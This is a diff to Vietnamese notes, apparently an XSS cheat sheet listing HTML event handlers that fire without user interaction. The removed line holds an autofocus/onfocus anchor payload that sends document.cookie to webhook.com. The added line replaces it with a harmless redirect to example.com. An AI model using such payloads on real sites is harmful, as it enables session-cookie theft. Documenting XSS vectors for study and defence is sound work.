@@ -366,7 +366,7 @@ Một số dạng đã gặp:
 | `onplay` | Media bắt đầu hoặc tiếp tục phát | Không, nếu autoplay được phép |
 | `ontoggle` | Trạng thái mở hoặc đóng của phần tử thay đổi | Không nhất thiết |
 | `onpageshow` | Trang được hiển thị | Không |
-|`autofocus` `onfocus`|dùng trong thẻ a giống tự động click: <a href="javascript:`http://webhook.com?cookie=`+document.cookie'  autofocus onfocus='location=this.href'">Visit</a>|
+|`autofocus` `onfocus`|dùng trong thẻ a giống tự động click: **<\a href='javascript:location="https://example.com"' autofocus onfocus='location=this.href'> xss </\a>**|
 
 **Lưu ý:**
 
